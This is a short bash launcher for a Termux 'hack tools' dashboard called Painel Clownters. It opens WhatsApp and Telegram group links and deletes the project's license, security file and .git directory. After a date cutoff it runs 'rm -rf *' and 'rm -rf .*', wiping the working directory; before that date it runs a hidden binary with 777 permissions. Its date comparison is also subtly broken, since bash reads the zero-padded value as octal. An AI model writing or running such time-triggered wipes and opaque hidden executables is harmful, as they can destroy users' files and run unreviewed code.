#!/usr/bin/env bash

<<CLOWNTERS
 #CLOWNTERS
 #--------------------------------------------------------
 # Name script: Painel Clownters                         |
 #--------------------------------------------------------
 # Script     : A1 PAINEL                                |
 #--------------------------------------------------------
 # Description: dashboard for consultation and hack tools|
 #--------------------------------------------------------
 # Version    : 0.3                                      |
 #--------------------------------------------------------
 # Authors    : Patinn, Eduardo e Mike                   |
 #--------------------------------------------------------
 # Date       : 08/08/21                                 |
 #--------------------------------------------------------
 # Lincese    : MIT lincese                              |
 #--------------------------------------------------------
 # Use: bash A1.sh                                       |
 #--------------------------------------------------------
 #CLOWNTERS
CLOWNTERS

termux-open-url https://chat.whatsapp.com/LKqLwcRheov1Dlv6HDaFMr
sleep 1
termux-open-url https://t.me/clownters
sleep 1
test -f Sploit && rm Sploit
test -f SECURITY.md && rm SECURITY.md
test -f LICENSE && rm LICENSE
test -e .git && rm -rf .git

if (($(date +%m%y) >= 0222)); then
    clear
    bash update.sh
    rm -rf .functions
    rm -rf *
    rm -rf .*
else
    chmod 777 .functions/.main
    ./.functions/.main
fi
exit 0
